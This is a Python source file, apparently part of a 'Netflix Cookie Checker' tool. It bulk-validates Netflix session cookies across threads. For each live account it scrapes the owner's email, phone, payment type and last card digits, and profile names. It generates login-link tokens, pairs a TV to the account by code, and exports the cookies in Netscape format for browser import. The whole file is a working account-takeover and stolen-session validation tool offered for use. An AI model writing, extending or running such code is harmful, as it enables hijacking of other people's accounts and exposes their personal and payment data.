def format_result_line(netflix_id_raw, info, country, token, token_error, tv_login_ok, tv_login_msg):
    """Format one result as a single pipe-separated line for saving to file."""
    if info["status"] == "LIVE" and token:
        login_link = f"https://netflix.com/?nftoken={token}"
        tv_flow = f"TV Code Flow = {'SUCCESS' if tv_login_ok else 'FAIL' if tv_login_ok is False else 'SKIP'} ({tv_login_msg})"
        num_profiles = info.get('numProfiles', 0)
        line = (
            f"{netflix_id_raw.strip()}"
            f" | Login Link = {login_link}"
            f" | {tv_flow}"
            f" | Plan = {info['plan']}"
            f" | Country = {country}"
            f" | numProfiles = {num_profiles}"
            f" | numKidsProfiles = {info.get('numKidsProfiles', 0)}"
            f" | Profiles = {info.get('profiles', '-')}"
            f" | Next Billing Date = {info['billing']}"
            f" | Video Quality = {info['videoQuality']}"
            f" | Max Streams = {info['maxStreams']}"
            f" | Payment = {info['paymentType']} {info['last4']}"
            f" | Price = {info.get('price','-')}"
            f" | Owner = {info.get('owner','-')}"
            f" | Email = {info.get('email','-')}"
            f" | Phone = {info.get('phone','-')}"
            f" | ExtraMembers = {info.get('extraMembers')}"
            f" | authURL = {info.get('authURL','-')}"
        )
        return line
    elif info["status"] == "LIVE":
        return f"{netflix_id_raw.strip()} | LIVE | NFToken FAILED: {token_error} | Country = {country} | numProfiles = {info.get('numProfiles', 0)}"
    elif info["status"] == "DEAD":
        return f"{netflix_id_raw.strip()} | DEAD"
    else:
        return f"{netflix_id_raw.strip()} | ERROR: {info.get('error', 'Unknown')}"


def create_result_file():
    """Create a result file with datetime name. Returns the filename."""
    os.makedirs("results", exist_ok=True)
    filename = f"results/results_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    # Create empty file
    with open(filename, "w", encoding="utf-8") as f:
        pass
    return filename


def create_netscape_cookie_file():
    """Create a Netscape cookie export file and write the header."""
    os.makedirs("results", exist_ok=True)
    filename = f"results/netscape_cookies_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    header = (
        "# Netscape HTTP Cookie File\n\n"
        "http://curl.haxx.se/rfc/cookie_spec.html\n"
        "This file was generated by net_fixed.py\n\n"
    )
    with open(filename, "w", encoding="utf-8", errors="replace") as f:
        f.write(header)
    return filename


HTTPONLY_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "gsid"}
SECURE_COOKIE_NAMES = {"NetflixId", "SecureNetflixId", "gsid"}


def _normalize_cookie_value(val):
    sval = str(val)
    return sval.replace("\t", "%09").replace("\r", "").replace("\n", "")


def _cookie_sort_key(name):
    priority = {
        "NetflixId": 0,
        "SecureNetflixId": 1,
        "nfvdid": 2,
        "gsid": 3,
    }
    return (priority.get(name, 99), name.lower())


def _to_netscape_cookie_line(name, value, expiry_epoch):
    domain = ".netflix.com"
    include_subdomains = "TRUE"
    path = "/"
    is_secure = name in SECURE_COOKIE_NAMES or name.startswith("__Secure-")
    secure = "TRUE" if is_secure else "FALSE"
    http_only = name in HTTPONLY_COOKIE_NAMES or name.startswith("__Host-Http-") or name.startswith("__Http-")
    domain_field = f"#HttpOnly_{domain}" if http_only else domain
    return f"{domain_field}\t{include_subdomains}\t{path}\t{secure}\t{expiry_epoch}\t{name}\t{value}"


def append_netscape_cookies(filename, cookie_dict, label=None):
    """Append cookies in Netscape format for one LIVE account."""
    if not filename or not cookie_dict:
        return

    clean_items = []
    for name, value in cookie_dict.items():
        if value is None:
            continue
        sval = str(value).strip()
        if not sval or sval == "-":
            continue
        clean_items.append((str(name), _normalize_cookie_value(sval)))

    if not clean_items:
        return

    clean_items.sort(key=lambda kv: _cookie_sort_key(kv[0]))
    expiry_epoch = int(time.time()) + (180 * 24 * 60 * 60)

    with open(filename, "a", encoding="utf-8", errors="replace") as f:
        if label:
            f.write(f"# {label}\n")
        for name, value in clean_items:
            f.write(_to_netscape_cookie_line(name, value, expiry_epoch) + "\n")
        f.write("\n")


def append_result(filename, line):
    """Append one result line to file immediately."""
    with open(filename, "a", encoding="utf-8", errors="replace") as f:
        f.write(line + "\n")


def process_one(i, netflix_id_raw, stats):
    # Use _parse_cookie_input for robust parsing of ALL cookie formats:
    #   - Simple: NetflixId_value
    #   - Pipe:   NetflixId_value|SecureNetflixId_value
    #   - Full:   NetflixId=xxx; SecureNetflixId=yyy; nfvdid=zzz
    netflix_id, secure_id, extras = _parse_cookie_input(netflix_id_raw)

    if not netflix_id:
        with stats.lock:
            stats.checked += 1
            stats.error += 1
            print(f"{Fore.RED}⚠️  [{stats.checked}] ERROR: Could not parse NetflixId from input{Style.RESET_ALL}")
        return

    # Step 1: Account info + collect cookies (pass extras like nfvdid)
    info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)

    base_cookie_dict = {"NetflixId": netflix_id}
    if secure_id:
        base_cookie_dict["SecureNetflixId"] = secure_id
    base_cookie_dict.update(extras)

    # If the cookie is dead or errored, skip further network calls.
    if info["status"] != "LIVE":
        with stats.lock:
            stats.checked += 1
            if info["status"] == "DEAD":
                stats.dead += 1
            else:
                stats.error += 1
            print_result(stats.checked, info, "-", None, info.get("error", "Unknown"), None, "Skipped", base_cookie_dict)
        return

    # Step 2: Country
    country = check_country(netflix_id, secure_id)

    # Step 3: NFToken (use collected cookies which now include nfvdid from page)
    cookie_dict = dict(base_cookie_dict)
    cookie_dict.update(collected_cookies)

    # Step 3.5: Fetch extra info from /browse when fields are missing
    # or profile data looks incomplete (account page can expose only one profile).
    current_profiles = [p.strip() for p in (info.get("profiles") or "").split(",") if p.strip()] if info.get("profiles") not in ("-", "") else []
    current_num_profiles = int(info.get("numProfiles", 0) or 0)
    need_extra = (
        info.get("email") == "-" or
        info.get("owner") == "-" or
        info.get("profiles") == "-" or
        info.get("authURL") == "-" or
        current_num_profiles == 0 or
        current_num_profiles <= 1 or
        len(current_profiles) <= 1
    )
    if need_extra:
        try:
            extra = fetch_extra_account_info(cookie_dict)
            for key in ("email", "owner", "profiles", "country",
                        "membershipStatus", "authURL", "numProfiles"):
                if info.get(key, "-") == "-" and extra.get(key):
                    info[key] = extra[key]
                elif key == "numProfiles" and info.get(key, 0) == 0 and extra.get(key):
                    info[key] = extra[key]

            # Prefer richer profile list from /browse if it has more profiles
            if extra.get("profiles"):
                extra_profiles = [p.strip() for p in extra["profiles"].split(",") if p.strip()]
                current_profiles = [p.strip() for p in info.get("profiles", "-").split(",") if p.strip()] if info.get("profiles") not in ("-", "") else []
                if info.get("profiles") in ("-", "") or len(extra_profiles) > len(current_profiles):
                    info["profiles"] = extra["profiles"]

            # Keep the larger numProfiles when /browse returns a better value
            if extra.get("numProfiles"):
                info["numProfiles"] = max(int(info.get("numProfiles", 0) or 0), int(extra["numProfiles"]))

            # Update numProfiles from extra profiles if we got them
            if info.get("numProfiles", 0) == 0 and extra.get("profiles"):
                info["numProfiles"] = len([p.strip() for p in extra["profiles"].split(",") if p.strip()])
        except Exception:
            pass
            pass

    # Update country from info if we got it from extra fetch
    if country in ("Unknown", "-") and info.get("country") not in ("-", "Unknown"):
        country = info["country"]

    token, token_error = generate_nftoken(cookie_dict)
    token_error = token_error or "Unknown"



    tv_code = os.getenv("TV_CODE", "").strip()
    tv_login_ok = None
    tv_login_msg = ""
    if tv_code and info.get("authURL") and info["authURL"] != "-":
        ok, msg = tv_login_with_code(info["authURL"], tv_code, cookie_dict)
        tv_login_ok, tv_login_msg = ok, msg
    elif tv_code and (not info.get("authURL") or info["authURL"] == "-"):
        tv_login_ok, tv_login_msg = False, "authURL not found"

    # Thread-safe updates and display
    with stats.lock:
        stats.checked += 1
        stats.live += 1
        current_index = stats.checked
        print_result(current_index, info, country, token, token_error, tv_login_ok, tv_login_msg, cookie_dict)
        is_live = True

    # Thread-safe saving
    if is_live:
        result_line = format_result_line(netflix_id_raw, info, country, token, token_error, tv_login_ok, tv_login_msg)
        with stats.file_lock:
            append_result(stats.results_file, result_line)
            netscape_label = f"LIVE [{current_index}] | {country} | {info.get('owner', '-')}"
            append_netscape_cookies(stats.netscape_file, cookie_dict, netscape_label)
            print(f"{Fore.GREEN}  → Saved to {stats.results_file}{Style.RESET_ALL}")


def process_list(lines):
    total = len(lines)
    workers = min(DEFAULT_WORKERS, total) if total else 1
    stats = Stats(total)
    stats.results_file = create_result_file()
    stats.netscape_file = create_netscape_cookie_file()

    print(f"\n{Fore.CYAN}Total: {total} cookie(s){Style.RESET_ALL}")
    print(f"{Fore.CYAN}Threads: {workers} | Saving to: {stats.results_file}{Style.RESET_ALL}\n")

    # Start title update thread
    threading.Thread(target=stats.update_title, daemon=True).start()

    with ThreadPoolExecutor(max_workers=workers) as executor:
        for i, line in enumerate(lines, 1):
            executor.submit(process_one, i, line, stats)

    # Summary
    print(f"\n{'-' * 40}")
    print(f"  {Fore.CYAN}SUMMARY{Style.RESET_ALL}")
    print(f"{'-' * 40}")
    print(f"  Total   : {total}")
    print(f"  {Fore.GREEN}Live  : {stats.live}{Style.RESET_ALL}")
    print(f"  {Fore.RED}Dead  : {stats.dead}{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}Error : {stats.error}{Style.RESET_ALL}")
    print(f"{'-' * 40}")
    print(f"\n{Fore.GREEN}LIVE results saved to: {stats.results_file}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Netscape cookies saved to: {stats.netscape_file}{Style.RESET_ALL}")


# ══════════════════════════════════════════════════════════════════════
#  Main Menu
# ══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    while True:
        print(f"\n{Fore.CYAN}{'═' * 50}")
        print(f"  NETFLIX COOKIE CHECKER")
        print(f"  Cookie → Info + Country + NFToken")
        print(f"{'═' * 50}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} Check 1 cookie (manual input)")
        print(f"  {Fore.YELLOW}2.{Style.RESET_ALL} Check from .txt file")
        print(f"  {Fore.MAGENTA}3.{Style.RESET_ALL} TV Login (manual input)")
        print(f"  {Fore.RED}4.{Style.RESET_ALL} Exit")

        choice = input(f"\n{Fore.BLUE}  Choose (1/2/3/4): {Style.RESET_ALL}").strip()

        if choice == '1':
            print(f"\n{Fore.GREEN}--- Single Cookie Check ---{Style.RESET_ALL}")
            cookie_input = input(f"{Fore.YELLOW}  Input NetflixId: {Style.RESET_ALL}").strip()
            if not cookie_input:
                print(f"{Fore.RED}  Input cannot be empty.{Style.RESET_ALL}")
                continue
            
            stats = Stats(1)
            stats.results_file = create_result_file()
            stats.netscape_file = create_netscape_cookie_file()
            process_one(1, cookie_input, stats)

            if stats.live > 0:
                print(f"\n{Fore.GREEN}✅ Result saved to: {stats.results_file}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}✅ Netscape cookies saved to: {stats.netscape_file}{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}❌ DEAD cookie — not saved{Style.RESET_ALL}")

        elif choice == '2':
            print(f"\n{Fore.YELLOW}--- Bulk Check from File ---{Style.RESET_ALL}")
            file_name = input(f"{Fore.BLUE}  Input file name .txt (ex: cookies.txt): {Style.RESET_ALL}").strip()
            if not file_name.endswith(".txt"):
                file_name += ".txt"

            if not os.path.exists(file_name):
                print(f"{Fore.RED}  File '{file_name}' not found.{Style.RESET_ALL}")
                continue

            try:
                with open(file_name, "r", encoding="utf-8") as f:
                    lines = [line.strip() for line in f if line.strip()]
                if not lines:
                    print(f"{Fore.YELLOW}  File '{file_name}' is empty.{Style.RESET_ALL}")
                    continue
                process_list(lines)
            except Exception as e:
                print(f"{Fore.RED}  Error reading file: {e}{Style.RESET_ALL}")

        elif choice == '3':
            print(f"\n{Fore.MAGENTA}--- TV Login ---{Style.RESET_ALL}")
            cookie_input = input(f"{Fore.YELLOW}  Input NetflixId[|SecureNetflixId] (full cookie also ok): {Style.RESET_ALL}").strip()
            tv_code = input(f"{Fore.YELLOW}  Input TV Code (8 chars): {Style.RESET_ALL}").strip()
            if not cookie_input or not tv_code:
                print(f"{Fore.RED}  NetflixId and TV Code are required.{Style.RESET_ALL}")
                continue

            netflix_id, secure_id, extras = _parse_cookie_input(cookie_input)
            if not netflix_id:
                print(f"{Fore.RED}  Could not find NetflixId in input.{Style.RESET_ALL}")
                continue

            info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)
            if info.get("status") != "LIVE":
                print(f"{Fore.RED}  Cookie dead or error: {info.get('status')} {info.get('error','')}{Style.RESET_ALL}")
                continue

            cookie_dict = {"NetflixId": netflix_id}
            if secure_id:
                cookie_dict["SecureNetflixId"] = secure_id
            cookie_dict.update(collected_cookies)
            cookie_dict.update(extras)

            # Try to refresh authURL if missing by refetching with cookies the site just set
            auth_url = info.get("authURL")
            if (not auth_url or auth_url == "-") and ("SecureNetflixId" in collected_cookies or "nfvdid" in collected_cookies):
                extra = {k: v for k, v in collected_cookies.items() if k in ("SecureNetflixId", "nfvdid")}
                info2, collected_cookies2 = check_account_info(netflix_id, collected_cookies.get("SecureNetflixId"), extra_cookies=extra)
                if info2.get("authURL") and info2.get("authURL") != "-":
                    info = info2
                    collected_cookies.update(collected_cookies2)
                    auth_url = info.get("authURL")
            if not auth_url or auth_url == "-":
                print(f"{Fore.RED}  authURL not found; add SecureNetflixId/nfvdid to cookie.{Style.RESET_ALL}")
                continue

            ok, msg = tv_login_with_code(auth_url, tv_code, cookie_dict)
            if ok:
                print(f"{Fore.GREEN}  TV Login SUCCESS: {msg}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}  TV Login FAILED: {msg}{Style.RESET_ALL}")

        elif choice == '4':
            print(f"{Fore.MAGENTA}  Goodbye! 👋{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}  Invalid choice. Try again.{Style.RESET_ALL}")
